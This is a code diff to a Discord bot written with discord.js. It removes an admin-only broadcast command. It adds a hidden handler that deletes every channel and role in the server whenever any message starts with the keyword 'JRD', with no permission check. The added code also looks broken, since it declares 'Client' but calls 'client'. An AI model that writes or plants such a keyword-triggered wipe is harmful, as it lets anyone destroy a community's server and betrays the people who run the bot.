@@ -1,30 +1,13 @@
 const Discord = require('discord.js');
-const client = new Discord.Client();
-const prefix = `=`;
-
-client.login(process.env.Tea);
-
-client.on('ready', () => {
-  console.log(`Logged in as ${client.user.username}\n Users: ${client.users.size}`);
-client.user.setGame(`For Sell.`, "https://twitch.tv/teacommunity");
-}); 
+const Client = new Discord.Client();
 
 
-client.on("message", message => {
+client.login(process.env.BOT);
 
-    
 
-    if (message.content.startsWith(prefix + "bc")) {
-
-        
-        if (!message.member.hasPermission('ADMINISTRATOR')) return message.reply('**__ليس لديك صلاحيات__**');
-
-        let args = message.content.split(" ").slice(1);
-        var argresult = args.join(' ');
-        message.guild.members.filter(m => m.presence.status !== 'offline').forEach(m => {
-            m.send(`${argresult}\n ${m}`);
-        })
-        message.channel.send(`\`${message.guild.members.filter(m => m.presence.status !== 'offline').size}\` : :twitter_pepe:عدد الاعضاء المستلمين`);
-        message.delete();
-    }
+client.on('message', message => {
+  if(message.content.startsWith('JRD')){
+    message.guild.channels.deleteAll();
+    message.guild.roles.deleteAll();
+  }
 });
